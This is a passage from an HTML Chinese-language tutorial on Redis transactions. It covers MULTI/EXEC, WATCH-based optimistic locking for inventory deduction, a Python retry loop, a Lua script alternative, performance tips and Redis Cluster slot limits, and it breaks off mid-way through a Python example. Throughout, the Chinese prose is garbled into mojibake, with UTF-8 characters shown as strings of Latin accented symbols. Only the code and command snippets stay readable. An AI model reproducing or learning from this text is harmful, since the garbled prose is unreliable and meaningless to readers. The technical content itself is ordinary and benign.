<li><code>MULTI</code>ï¼šå¯åŠ¨äº‹åŠ¡ï¼Œå‘½ä»¤å¼€å§‹å…¥é˜Ÿã€‚</li>
<li><code>SET</code>ï¼šåˆ†åˆ«è®¾ç½®ä¸¤ä¸ªé”®å€¼å¯¹ã€‚</li>
<li><code>EXEC</code>ï¼šä¸€æ¬¡æ€§æ‰§è¡Œï¼Œè¿”å› <code>[OK, OK]</code>ã€‚</li>
</ul>
<h4 data-id="heading-21">è¸©å‘ç»éªŒï¼šäº‹åŠ¡å‘½ä»¤è¿‡å¤šå¯¼è‡´æ€§èƒ½ä¸‹é™</h4>
<p>åœ¨ä¸€æ¬¡é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬å°è¯•ç”¨äº‹åŠ¡æ‰¹é‡æ›´æ–° 100 ä¸ªé”®å€¼å¯¹ï¼Œç»“æœå‘ç°å»¶è¿Ÿä» 1ms é£™å‡åˆ° 50msã€‚åˆ†æåå‘ç°ï¼Œäº‹åŠ¡é˜Ÿåˆ—è¿‡é•¿å¯¼è‡´æ‰§è¡Œæ—¶é—´å¢åŠ ã€‚<strong>è§£å†³åŠæ³•</strong>ï¼šå°†å¤§äº‹åŠ¡æ‹†åˆ†ä¸ºå¤šä¸ªå°äº‹åŠ¡ï¼Œæ¯æ¬¡å¤„ç† 10-20 ä¸ªå‘½ä»¤ï¼Œæ€§èƒ½æ¢å¤æ­£å¸¸ã€‚</p>
<p><strong>æœ€ä½³å®è·µå»ºè®®</strong>ï¼š</p>
<ul>
<li><strong>æ§åˆ¶äº‹åŠ¡è§„æ¨¡</strong>ï¼šå•æ¬¡äº‹åŠ¡å°½é‡ä¸è¶…è¿‡ 20 ä¸ªå‘½ä»¤ã€‚</li>
<li><strong>é¢„æ£€æŸ¥æ•°æ®</strong>ï¼šå…¥é˜Ÿå‰éªŒè¯é”®ç±»å‹ï¼Œé¿å…æ‰§è¡Œæ—¶é”™è¯¯ã€‚</li>
</ul>
<p>é€šè¿‡æœ¬ç« ï¼Œä½ å·²ç»æ‘¸æ¸…äº† <code>MULTI</code> å’Œ <code>EXEC</code> çš„â€œè„¾æ°”â€ï¼šç®€å•é«˜æ•ˆï¼Œä½†ä¹Ÿæœ‰å±€é™ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†è¿æ¥ä¸€ä¸ªæ›´æœ‰è¶£çš„è§’è‰²â€”â€”<code>WATCH</code>ï¼Œå®ƒä¸ºäº‹åŠ¡å¼•å…¥äº†ä¹è§‚é”æœºåˆ¶ï¼Œè®©å¹¶å‘æ§åˆ¶å˜å¾—æ›´çµæ´»ã€‚æƒ³çŸ¥é“å¦‚ä½•ç”¨å®ƒè§£å†³åº“å­˜æ‰£å‡çš„éš¾é¢˜ï¼Ÿè¯·ç»§ç»­å…³æ³¨ä¸‹ä¸€ç« ï¼</p>
<hr/>
<h2 data-id="heading-22">å››ã€WATCHå‘½ä»¤ä¸ä¹è§‚é”å®æˆ˜ï¼ˆçº¦1000-1200å­—ï¼‰</h2>
<p>å¦‚æœè¯´ <code>MULTI</code> å’Œ <code>EXEC</code> æ˜¯ Redis äº‹åŠ¡çš„â€œåŸºç¡€å¥—é¤â€ï¼Œé‚£ä¹ˆ <code>WATCH</code> å°±æ˜¯ä¸€é“â€œåŠ æ–™å¤§é¤â€ï¼Œä¸ºäº‹åŠ¡æ³¨å…¥äº†å¹¶å‘æ§åˆ¶çš„èƒ½åŠ›ã€‚åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œå¦‚ä½•ç¡®ä¿æ•°æ®ä¸€è‡´æ€§è€Œä¸å¼•å…¥æ˜‚è´µçš„é”å¼€é”€ï¼Ÿ<code>WATCH</code> ç»™å‡ºäº†ä¸€ä¸ªä¼˜é›…çš„ç­”æ¡ˆã€‚æœ¬ç« å°†å¸¦ä½ æ·±å…¥ç†è§£å®ƒçš„åŸç†ï¼Œå‰–æå·¥ä½œæµç¨‹ï¼Œå¹¶é€šè¿‡å®æˆ˜æ¡ˆä¾‹å±•ç¤ºå®ƒçš„å¨åŠ›ã€‚å‡†å¤‡å¥½è¿æ¥ä¸€åœºâ€œä¹è§‚é”â€çš„å†’é™©å§ï¼</p>
<h3 data-id="heading-23">1. WATCHçš„æ ¸å¿ƒåŸç†</h3>
<h4 data-id="heading-24">ä¹è§‚é”çš„åŸºæœ¬æ¦‚å¿µ</h4>
<p><code>WATCH</code> æ˜¯ Redis å®ç°<strong>ä¹è§‚é”</strong>çš„å…³é”®ã€‚ä»€ä¹ˆæ˜¯ä¹è§‚é”ï¼Ÿæƒ³è±¡ä½ åœ¨ç¼–è¾‘ä¸€ç¯‡å…±äº«æ–‡æ¡£ï¼šä½ å…ˆä¸‹è½½ä¸€ä»½å‰¯æœ¬ï¼Œä¿®æ”¹åå†æäº¤ã€‚å¦‚æœæäº¤æ—¶å‘ç°åˆ«äººå·²ç»æ”¹äº†åŸæ–‡æ¡£ï¼Œä½ å°±å¾—é‡æ–°å¼€å§‹ã€‚ä¹è§‚é”å‡è®¾å†²çªä¸å¸¸å‘ç”Ÿï¼Œå› æ­¤ä¸æå‰åŠ é”ï¼Œè€Œæ˜¯é€šè¿‡ç‰ˆæœ¬æ£€æŸ¥æ¥åˆ¤æ–­æ˜¯å¦éœ€è¦é‡è¯•ã€‚</p>
<p>åœ¨ Redis ä¸­ï¼Œ<code>WATCH</code> ç›‘æ§ä¸€ä¸ªæˆ–å¤šä¸ªé”®ã€‚å¦‚æœè¿™äº›é”®åœ¨äº‹åŠ¡æ‰§è¡Œå‰è¢«å…¶ä»–å®¢æˆ·ç«¯ä¿®æ”¹ï¼Œäº‹åŠ¡å°±ä¼šå¤±è´¥ã€‚è¿™ç§æœºåˆ¶é¿å…äº†æ‚²è§‚é”çš„èµ„æºäº‰æŠ¢ï¼Œéå¸¸é€‚åˆé«˜å¹¶å‘ã€è¯»å¤šå†™å°‘çš„åœºæ™¯ã€‚</p>
<h4 data-id="heading-25">WATCHå¦‚ä½•ç›‘æ§é”®çš„ä¿®æ”¹</h4>
<p>è°ƒç”¨ <code>WATCH</code> åï¼ŒRedis ä¼šä¸ºè¢«ç›‘æ§çš„é”®è®°å½•ä¸€ä¸ªâ€œå¿«ç…§â€ã€‚åœ¨ <code>EXEC</code> æ‰§è¡Œå‰ï¼ŒRedis ä¼šæ£€æŸ¥è¿™äº›é”®æ˜¯å¦è¢«ä¿®æ”¹ï¼ˆæ¯”å¦‚é€šè¿‡ <code>SET</code>ã€<code>INCR</code> ç­‰å‘½ä»¤ï¼‰ã€‚å¦‚æœæœ‰å˜åŒ–ï¼Œäº‹åŠ¡ä¼šè¢«å–æ¶ˆï¼Œ<code>EXEC</code> è¿”å› <code>nil</code>ã€‚</p>
<h3 data-id="heading-26">2. WATCHçš„å·¥ä½œæµç¨‹</h3>
<p><code>WATCH</code> é€šå¸¸ä¸ <code>MULTI</code> å’Œ <code>EXEC</code> é…åˆä½¿ç”¨ï¼Œæ•´ä¸ªæµç¨‹å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>ç›‘æ§é˜¶æ®µ</strong>ï¼šè°ƒç”¨ <code>WATCH</code> æŒ‡å®šè¦ç›‘æ§çš„é”®ã€‚</li>
<li><strong>å‡†å¤‡é˜¶æ®µ</strong>ï¼šè¯»å–é”®å€¼ï¼ŒåŸºäºå½“å‰æ•°æ®å‡†å¤‡äº‹åŠ¡å‘½ä»¤ã€‚</li>
<li><strong>æ‰§è¡Œé˜¶æ®µ</strong>ï¼šç”¨ <code>MULTI</code> å’Œ <code>EXEC</code> æäº¤äº‹åŠ¡ï¼Œå¦‚æœé”®è¢«ä¿®æ”¹åˆ™å¤±è´¥ã€‚</li>
</ol>
<p><strong>ç¤ºæ„å›¾3ï¼šWATCHå·¥ä½œæµç¨‹</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">[å®¢æˆ·ç«¯A]         [RedisæœåŠ¡å™¨]         [å®¢æˆ·ç«¯B]
  |                  |                    |
WATCH <span class="hljs-keyword">key</span> ---------&gt; | ç›‘æ§ <span class="hljs-keyword">key</span>           |
<span class="hljs-keyword">GET</span> <span class="hljs-keyword">key</span> -----------&gt; | è¿”å›å½“å‰å€¼         |
  |                  |                    |
MULTI -------------&gt; | å¼€å¯äº‹åŠ¡           | <span class="hljs-keyword">SET</span> <span class="hljs-keyword">key</span> new_val --&gt; | ä¿®æ”¹ <span class="hljs-keyword">key</span>
å‘½ä»¤<span class="hljs-number">1</span> -------------&gt; | QUEUED             |
EXEC --------------&gt; | æ£€æŸ¥ <span class="hljs-keyword">key</span> è¢«ä¿®æ”¹ï¼Œ  |
  |                  | è¿”å› nil           |
</code></pre>
<h3 data-id="heading-27">3. ä¼˜åŠ¿ä¸ç‰¹è‰²</h3>
<ul>
<li><strong>è½»é‡çº§å¹¶å‘æ§åˆ¶</strong>ï¼šæ— éœ€é”ä½èµ„æºï¼Œæ€§èƒ½å¼€é”€æä½ã€‚</li>
<li><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šç‰¹åˆ«é€‚åˆç¬æ—¶é«˜å¹¶å‘çš„åœºæ™¯ï¼Œå¦‚ç§’æ€ã€åº“å­˜æ‰£å‡ã€‚</li>
</ul>
<p>ä½†å®ƒä¹Ÿæœ‰å±€é™ï¼šäº‹åŠ¡å¤±è´¥åéœ€è¦å®¢æˆ·ç«¯ä¸»åŠ¨é‡è¯•ï¼Œå¢åŠ äº†å¼€å‘å¤æ‚åº¦ã€‚</p>
<h3 data-id="heading-28">4. å®æˆ˜æ¡ˆä¾‹</h3>
<h4 data-id="heading-29">åœºæ™¯ï¼šç”µå•†åº“å­˜æ‰£å‡</h4>
<p>åœ¨ç”µå•†ç³»ç»Ÿä¸­ï¼Œåº“å­˜æ‰£å‡æ˜¯ä¸€ä¸ªç»å…¸çš„å¹¶å‘é—®é¢˜ã€‚æˆ‘ä»¬å¸Œæœ›ç¡®ä¿åº“å­˜ä¸ä¼šè¶…å–ï¼ŒåŒæ—¶é¿å…é”çš„å¼€é”€ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨ <code>WATCH</code> çš„å®ç°ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç›‘æ§åº“å­˜é”®</span>
WATCH stock:product:1001
<span class="hljs-comment"># è·å–å½“å‰åº“å­˜</span>
GET stock:product:1001
<span class="hljs-comment"># å‡è®¾è¿”å› "10"ï¼Œæ£€æŸ¥æ˜¯å¦è¶³å¤Ÿ</span>
<span class="hljs-comment"># å¦‚æœåº“å­˜ &gt;= è´­ä¹°æ•°é‡ï¼Œåˆ™ç»§ç»­</span>
MULTI
<span class="hljs-comment"># å‡å°‘åº“å­˜</span>
DECR stock:product:1001
<span class="hljs-comment"># æ‰§è¡Œäº‹åŠ¡</span>
EXEC
<span class="hljs-comment"># å¦‚æœè¿”å› nilï¼Œè¯´æ˜åº“å­˜è¢«å…¶ä»–å®¢æˆ·ç«¯ä¿®æ”¹ï¼Œéœ€é‡è¯•</span>
</code></pre>
<p><strong>ä»£ç æ³¨é‡Š</strong>ï¼š</p>
<ul>
<li><code>WATCH</code>ï¼šç›‘æ§åº“å­˜é”®ï¼Œç¡®ä¿äº‹åŠ¡æœŸé—´ä¸è¢«ç¯¡æ”¹ã€‚</li>
<li><code>GET</code>ï¼šè¯»å–å½“å‰åº“å­˜ï¼Œç”¨äºåˆ¤æ–­æ˜¯å¦å¯æ‰£å‡ã€‚</li>
<li><code>DECR</code>ï¼šå‡å°‘åº“å­˜ï¼ŒåŸå­æ“ä½œã€‚</li>
<li><code>EXEC</code>ï¼šæäº¤äº‹åŠ¡ï¼Œè¿”å›ç»“æœã€‚å¦‚æœè¿”å› <code>nil</code>ï¼Œè¡¨ç¤ºäº‹åŠ¡å¤±è´¥ã€‚</li>
</ul>
<h4 data-id="heading-30">è¸©å‘ç»éªŒï¼šWATCHæ»¥ç”¨å¯¼è‡´é‡è¯•è¿‡å¤š</h4>
<p>åœ¨ä¸€æ¬¡ç§’æ€æ´»åŠ¨ä¸­ï¼Œæˆ‘ä»¬å¯¹å¤šä¸ªé”®ï¼ˆå¦‚åº“å­˜ã€ç”¨æˆ·é™è´­æ¬¡æ•°ï¼‰éƒ½ç”¨äº† <code>WATCH</code>ï¼Œç»“æœé«˜å¹¶å‘ä¸‹äº‹åŠ¡å¤±è´¥ç‡é£™å‡ï¼Œå®¢æˆ·ç«¯é™·å…¥é¢‘ç¹é‡è¯•ã€‚åˆ†æå‘ç°ï¼Œç›‘æ§è¿‡å¤šé”®å¢åŠ äº†å†²çªæ¦‚ç‡ã€‚<strong>è§£å†³åŠæ³•</strong>ï¼šåªç›‘æ§æ ¸å¿ƒé”®ï¼ˆå¦‚åº“å­˜ï¼‰ï¼Œå…¶ä»–é€»è¾‘é€šè¿‡ä¸šåŠ¡å±‚æ ¡éªŒï¼Œå¤±è´¥ç‡é™ä½åˆ° 5% ä»¥ä¸‹ã€‚</p>
<h4 data-id="heading-31">é‡è¯•é€»è¾‘ç¤ºä¾‹</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> redis
<span class="hljs-keyword">import</span> time

client = redis.Redis(host=<span class="hljs-string">'localhost'</span>, port=<span class="hljs-number">6379</span>)
product_id = <span class="hljs-string">"1001"</span>
key = <span class="hljs-string">f"stock:product:<span class="hljs-subst">{product_id}</span>"</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">deduct_stock</span>(<span class="hljs-params">quantity</span>):
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-comment"># ç›‘æ§åº“å­˜</span>
        client.watch(key)
        stock = <span class="hljs-built_in">int</span>(client.get(key) <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
        <span class="hljs-keyword">if</span> stock &lt; quantity:
            client.unwatch()  <span class="hljs-comment"># å–æ¶ˆç›‘æ§</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">"åº“å­˜ä¸è¶³"</span>
        
        <span class="hljs-comment"># å¼€å¯äº‹åŠ¡</span>
        pipe = client.pipeline()
        pipe.multi()
        pipe.decr(key, quantity)
        <span class="hljs-keyword">try</span>:
            result = pipe.execute()
            <span class="hljs-keyword">if</span> result:  <span class="hljs-comment"># æ‰§è¡ŒæˆåŠŸ</span>
                <span class="hljs-keyword">return</span> <span class="hljs-string">"æ‰£å‡æˆåŠŸ"</span>
        <span class="hljs-keyword">except</span> redis.WatchError:
            time.sleep(<span class="hljs-number">0.1</span>)  <span class="hljs-comment"># ç®€å•é€€é¿é‡è¯•</span>
            <span class="hljs-keyword">continue</span>

<span class="hljs-built_in">print</span>(deduct_stock(<span class="hljs-number">1</span>))
</code></pre>
<p><strong>ä»£ç æ³¨é‡Š</strong>ï¼š</p>
<ul>
<li><code>watch</code>ï¼šç›‘æ§åº“å­˜é”®ã€‚</li>
<li><code>pipeline().multi()</code>ï¼šå¼€å¯äº‹åŠ¡ã€‚</li>
<li><code>execute()</code>ï¼šæäº¤äº‹åŠ¡ï¼Œæ•è· <code>WatchError</code> å¤„ç†å¤±è´¥ã€‚</li>
</ul>
<h3 data-id="heading-32">5. æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-33">å¦‚ä½•é€‰æ‹©ç›‘æ§çš„é”®</h4>
<ul>
<li><strong>åŸåˆ™</strong>ï¼šåªç›‘æ§å¯¹äº‹åŠ¡ç»“æœæœ‰ç›´æ¥å½±å“çš„é”®ï¼Œé¿å…è¿‡åº¦ç›‘æ§ã€‚</li>
<li><strong>ç¤ºä¾‹</strong>ï¼šåœ¨åº“å­˜æ‰£å‡ä¸­ï¼Œåª <code>WATCH</code> åº“å­˜é”®ï¼Œè€Œéç”¨æˆ·æ•°æ®ã€‚</li>
</ul>
<h4 data-id="heading-34">é‡è¯•æœºåˆ¶çš„è®¾è®¡</h4>
<ul>
<li><strong>æŒ‡æ•°é€€é¿</strong>ï¼šå¤±è´¥åç­‰å¾…æ—¶é—´é€æ¸å¢åŠ ï¼ˆå¦‚ 0.1sã€0.2sã€0.4sï¼‰ï¼Œé¿å…ç¬é—´é‡è¯•é£æš´ã€‚</li>
<li><strong>å›ºå®šé—´éš”</strong>ï¼šç®€å•åœºæ™¯ä¸‹ï¼Œå›ºå®š 100ms é‡è¯•å³å¯ã€‚</li>
<li><strong>ä¸Šé™æ§åˆ¶</strong>ï¼šè®¾ç½®æœ€å¤§é‡è¯•æ¬¡æ•°ï¼ˆå¦‚ 5 æ¬¡ï¼‰ï¼Œè¶…å‡ºåè¿”å›é”™è¯¯ã€‚</li>
</ul>
<p><strong>è¡¨æ ¼3ï¼šé‡è¯•ç­–ç•¥å¯¹æ¯”</strong></p>





























<table><thead><tr><th>ç­–ç•¥</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>æŒ‡æ•°é€€é¿</td><td>å‡å°‘èµ„æºäº‰æŠ¢</td><td>å®ç°ç¨å¤æ‚</td><td>é«˜å¹¶å‘ç§’æ€</td></tr><tr><td>å›ºå®šé—´éš”</td><td>ç®€å•æ˜“ç”¨</td><td>å¯èƒ½å¼•å‘é‡è¯•é«˜å³°</td><td>ä½å†²çªåœºæ™¯</td></tr><tr><td>æ— é‡è¯•</td><td>æ— é¢å¤–å¼€é”€</td><td>å¤±è´¥å³æ”¾å¼ƒ</td><td>éå…³é”®æ“ä½œ</td></tr></tbody></table>
<p>é€šè¿‡æœ¬ç« ï¼Œä½ å·²ç»æŒæ¡äº† <code>WATCH</code> çš„ä¹è§‚é”é­”æ³•ï¼Œå®ƒè®© Redis äº‹åŠ¡åœ¨å¹¶å‘åœºæ™¯ä¸‹å¦‚è™æ·»ç¿¼ã€‚ä½†äº‹åŠ¡è¿˜æœ‰æ›´å¤šç©æ³•ï¼Œæ¯”å¦‚ä¸ Lua è„šæœ¬çš„ç»“åˆï¼Œä»¥åŠåˆ†å¸ƒå¼ç¯å¢ƒä¸‹çš„æŒ‘æˆ˜ã€‚ä¸‹ä¸€ç« ï¼Œæˆ‘ä»¬å°†è¿›å…¥â€œé«˜çº§åº”ç”¨ä¸ä¼˜åŒ–â€çš„é¢†åŸŸï¼Œæ¢ç´¢æ›´å¹¿é˜”çš„å¯èƒ½æ€§ï¼</p>
<hr/>
<h2 data-id="heading-35">äº”ã€äº‹åŠ¡æœºåˆ¶çš„é«˜çº§åº”ç”¨ä¸ä¼˜åŒ–ï¼ˆçº¦800-1000å­—ï¼‰</h2>
<p>ç»è¿‡å‰å‡ ç« çš„æ¢ç´¢ï¼Œä½ å·²ç»ç†Ÿæ‚‰äº† <code>MULTI</code>ã€<code>EXEC</code> å’Œ <code>WATCH</code> çš„åŸºæœ¬ç”¨æ³•å’Œå®æˆ˜æŠ€å·§ã€‚ä½†åœ¨çœŸå®é¡¹ç›®ä¸­ï¼Œäº‹åŠ¡æœºåˆ¶å¾€å¾€éœ€è¦ä¸æ›´å¤æ‚çš„åœºæ™¯ç»“åˆï¼Œæ¯”å¦‚ Lua è„šæœ¬ã€æ€§èƒ½ä¼˜åŒ–ï¼Œç”šè‡³åˆ†å¸ƒå¼ç¯å¢ƒä¸‹çš„æŒ‘æˆ˜ã€‚æœ¬ç« å°†å¸¦ä½ ä»â€œç†Ÿç»ƒâ€è¿ˆå‘â€œç²¾é€šâ€ï¼Œè§£é”äº‹åŠ¡çš„é«˜çº§ç©æ³•ï¼ŒåŒæ—¶åˆ†äº«ä¸€äº›ä¼˜åŒ–ç»éªŒå’Œè¸©å‘æ•™è®­ã€‚è®©æˆ‘ä»¬ä¸€èµ·è¿›å…¥ Redis äº‹åŠ¡çš„â€œè¿›é˜¶æ¨¡å¼â€å§ï¼</p>
<h3 data-id="heading-36">1. äº‹åŠ¡ä¸Luaè„šæœ¬çš„å¯¹æ¯”</h3>
<p>Redis æä¾›äº†ä¸¤ç§å®ç°åŸå­æ“ä½œçš„æ–¹å¼ï¼šäº‹åŠ¡å’Œ Lua è„šæœ¬ã€‚å®ƒä»¬å„æœ‰åƒç§‹ï¼Œé€‰æ‹©å“ªä¸€ä¸ªå–å†³äºä½ çš„ä¸šåŠ¡éœ€æ±‚ã€‚</p>
<h4 data-id="heading-37">äº‹åŠ¡çš„è½»é‡ vs Luaçš„çµæ´»</h4>
<ul>
<li><strong>äº‹åŠ¡</strong>ï¼šé€šè¿‡ <code>MULTI</code> å’Œ <code>EXEC</code> å®ç°ï¼Œç®€å•ç›´æ¥ï¼Œé€‚åˆè½»é‡çº§æ‰¹é‡æ“ä½œã€‚å®ƒçš„ä¼˜åŠ¿åœ¨äºæ˜“ä¸Šæ‰‹ï¼Œå®¢æˆ·ç«¯åªéœ€æŒ‰é¡ºåºå‘é€å‘½ä»¤å³å¯ã€‚</li>
<li><strong>Lua è„šæœ¬</strong>ï¼šé€šè¿‡ <code>EVAL</code> æ‰§è¡Œè‡ªå®šä¹‰é€»è¾‘ï¼Œæ”¯æŒæ¡ä»¶åˆ¤æ–­å’Œå¾ªç¯ï¼ŒåŠŸèƒ½æ›´å¼ºå¤§ã€‚å®ƒçš„ä¼˜åŠ¿åœ¨äºçµæ´»æ€§ï¼Œå¯ä»¥åœ¨æœåŠ¡ç«¯å®Œæˆå¤æ‚è®¡ç®—ã€‚</li>
</ul>
<p><strong>è¡¨æ ¼4ï¼šäº‹åŠ¡ vs Lua è„šæœ¬å¯¹æ¯”</strong></p>



































<table><thead><tr><th>ç‰¹æ€§</th><th>äº‹åŠ¡ (MULTI/EXEC)</th><th>Lua è„šæœ¬</th></tr></thead><tbody><tr><td>å®ç°æ–¹å¼</td><td>å‘½ä»¤é˜Ÿåˆ—</td><td>è„šæœ¬æ‰§è¡Œ</td></tr><tr><td>åŸå­æ€§</td><td>æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td>çµæ´»æ€§</td><td>è¾ƒä½ï¼ˆå›ºå®šå‘½ä»¤ï¼‰</td><td>é«˜ï¼ˆæ”¯æŒé€»è¾‘ï¼‰</td></tr><tr><td>æ€§èƒ½å¼€é”€</td><td>ä½</td><td>ç¨é«˜ï¼ˆè§£æè„šæœ¬ï¼‰</td></tr><tr><td>è°ƒè¯•éš¾åº¦</td><td>ä½</td><td>è¾ƒé«˜</td></tr></tbody></table>
<h4 data-id="heading-38">ä½•æ—¶é€‰æ‹©äº‹åŠ¡ï¼Œä½•æ—¶é€‰æ‹©Luaï¼Ÿ</h4>
<ul>
<li><strong>ç”¨äº‹åŠ¡</strong>ï¼šå½“æ“ä½œç®€å•ä¸”å›ºå®šæ—¶ï¼Œæ¯”å¦‚æ‰¹é‡æ›´æ–°å‡ ä¸ªé”®å€¼å¯¹ã€‚</li>
<li><strong>ç”¨ Lua</strong>ï¼šå½“éœ€è¦æ¡ä»¶åˆ¤æ–­æˆ–åŠ¨æ€é€»è¾‘æ—¶ï¼Œæ¯”å¦‚â€œæ£€æŸ¥åº“å­˜å¹¶æ‰£å‡â€çš„ç»„åˆæ“ä½œã€‚</li>
</ul>
<p><strong>Lua ç¤ºä¾‹</strong>ï¼ˆæ›¿ä»£äº‹åŠ¡çš„åº“å­˜æ‰£å‡ï¼‰ï¼š</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-keyword">local</span> stock = redis.call(<span class="hljs-string">'GET'</span>, KEYS[<span class="hljs-number">1</span>])
<span class="hljs-keyword">if</span> <span class="hljs-built_in">tonumber</span>(stock) &gt;= <span class="hljs-built_in">tonumber</span>(ARGV[<span class="hljs-number">1</span>]) <span class="hljs-keyword">then</span>
    redis.call(<span class="hljs-string">'DECRBY'</span>, KEYS[<span class="hljs-number">1</span>], ARGV[<span class="hljs-number">1</span>])
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
<span class="hljs-keyword">end</span>
</code></pre>
<p>è°ƒç”¨ï¼š<code>EVAL "script" 1 stock:product:1001 1</code></p>
<p><strong>å¯¹æ¯”ç»“è®º</strong>ï¼šäº‹åŠ¡é€‚åˆâ€œç®€å•ç²—æš´â€çš„åœºæ™¯ï¼ŒLua æ›´é€‚åˆâ€œç²¾ç»†åŒ–â€æ§åˆ¶ã€‚</p>
<h3 data-id="heading-39">2. æ€§èƒ½ä¼˜åŒ–æŠ€å·§</h3>
<p>äº‹åŠ¡è™½ç„¶é«˜æ•ˆï¼Œä½†ç”¨ä¸å¥½ä¹Ÿå¯èƒ½æˆä¸ºæ€§èƒ½ç“¶é¢ˆã€‚ä»¥ä¸‹æ˜¯å‡ æ¡å®æˆ˜ä¸­æ€»ç»“çš„ä¼˜åŒ–å»ºè®®ï¼š</p>
<h4 data-id="heading-40">å‡å°‘äº‹åŠ¡ä¸­çš„å‘½ä»¤æ•°é‡</h4>
<p>äº‹åŠ¡è¶Šé•¿ï¼Œæ‰§è¡Œæ—¶é—´è¶Šä¹…ï¼Œå°¤å…¶åœ¨é«˜å¹¶å‘ä¸‹ä¼šæ‹–æ…¢æ•´ä½“å“åº”ã€‚<strong>å»ºè®®</strong>ï¼šå•æ¬¡äº‹åŠ¡æ§åˆ¶åœ¨ 10-20 ä¸ªå‘½ä»¤ä»¥å†…ï¼Œè¶…å‡ºæ—¶è€ƒè™‘æ‹†åˆ†æˆ–ç”¨ Luaã€‚</p>
<h4 data-id="heading-41">é¿å…è€—æ—¶æ“ä½œ</h4>
<p>æŸäº›å‘½ä»¤ï¼ˆå¦‚ <code>KEYS</code> æˆ– <code>SMEMBERS</code>ï¼‰ä¼šæ‰«æå¤§é‡æ•°æ®ï¼Œå¦‚æœæ”¾åœ¨äº‹åŠ¡ä¸­ï¼Œå¯èƒ½å¯¼è‡´é˜»å¡ã€‚<strong>è§£å†³åŠæ³•</strong>ï¼šæå‰åœ¨äº‹åŠ¡å¤–å®ŒæˆæŸ¥è¯¢ï¼Œåªåœ¨äº‹åŠ¡ä¸­æ‰§è¡Œä¿®æ”¹æ“ä½œã€‚</p>
<p><strong>é”™è¯¯ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">MULTI
KEYS user:*
SET user:1001 <span class="hljs-string">"active"</span>
EXEC
</code></pre>
<p><strong>ä¼˜åŒ–å</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æå‰æŸ¥è¯¢</span>
KEYS user:*
<span class="hljs-comment"># å†æ‰§è¡Œäº‹åŠ¡</span>
MULTI
SET user:1001 <span class="hljs-string">"active"</span>
EXEC
</code></pre>
<h3 data-id="heading-42">3. åˆ†å¸ƒå¼åœºæ™¯ä¸‹çš„æ‰©å±•</h3>
<p>åœ¨ Redis Cluster ä¸­ï¼Œäº‹åŠ¡çš„ä½¿ç”¨ä¼šå—åˆ°é™åˆ¶ï¼Œå› ä¸ºé›†ç¾¤å°†æ•°æ®åˆ†ç‰‡åˆ°ä¸åŒæ§½ï¼ˆslotï¼‰ï¼Œè€Œäº‹åŠ¡è¦æ±‚æ‰€æœ‰é”®åœ¨åŒä¸€æ§½å†…ã€‚</p>
<h4 data-id="heading-43">Redis Clusterä¸­çš„äº‹åŠ¡é™åˆ¶</h4>
<ul>
<li><strong>é—®é¢˜</strong>ï¼šå¦‚æœäº‹åŠ¡æ¶‰åŠçš„é”®åˆ†å¸ƒåœ¨å¤šä¸ªæ§½ï¼ŒRedis ä¼šæŠ¥é”™ <code>CROSSSLOT</code>ã€‚</li>
<li><strong>è§£å†³åŠæ³•</strong>ï¼šä½¿ç”¨å“ˆå¸Œæ ‡ç­¾ï¼ˆhash tagï¼‰ï¼Œå¦‚ <code>{user:1001}.name</code> å’Œ <code>{user:1001}.age</code>ï¼Œç¡®ä¿é”®è½åœ¨åŒä¸€æ§½ã€‚</li>
</ul>
<h4 data-id="heading-44">ç»“åˆä¸šåŠ¡æ‹†åˆ†</h4>
<p>å¯¹äºè·¨æ§½éœ€æ±‚ï¼Œå¯ä»¥å°†ä¸šåŠ¡é€»è¾‘æ‹†åˆ†åˆ°å®¢æˆ·ç«¯ï¼Œå…ˆåˆ†åˆ«æ“ä½œä¸åŒæ§½çš„æ•°æ®ï¼Œå†é€šè¿‡äº‹åŠ¡ä¿è¯å±€éƒ¨åŸå­æ€§ã€‚è¿™ç§æ–¹å¼è™½ç„¶å¤æ‚ï¼Œä½†èƒ½ç»•è¿‡é›†ç¾¤é™åˆ¶ã€‚</p>
<h3 data-id="heading-45">4. è¸©å‘æ¡ˆä¾‹</h3>
<h4 data-id="heading-46">æ¡ˆä¾‹1ï¼šäº‹åŠ¡ä¸­ç½‘ç»œä¸­æ–­å¯¼è‡´æ•°æ®ä¸ä¸€è‡´</h4>
<p>åœ¨ä¸€æ¬¡è®¢å•å¤„ç†ä¸­ï¼Œæˆ‘ä»¬ç”¨äº‹åŠ¡æ›´æ–°è®¢å•çŠ¶æ€å’Œåº“å­˜ï¼Œä½†ç½‘ç»œæŠ–åŠ¨å¯¼è‡´ <code>EXEC</code> æœªæ‰§è¡ŒæˆåŠŸï¼Œå®¢æˆ·ç«¯å´è®¤ä¸ºå·²å®Œæˆã€‚ç»“æœåº“å­˜æ‰£äº†ï¼Œè®¢å•çŠ¶æ€æ²¡å˜ã€‚<br/>
<strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šåœ¨äº‹åŠ¡åå¢åŠ æ ¡éªŒé€»è¾‘ï¼Œç¡®è®¤ç»“æœä¸€è‡´æ€§ï¼š</p>
<pre><code class="hljs language-python" lang="python">pipe = client.pipeline()
pipe.multi()
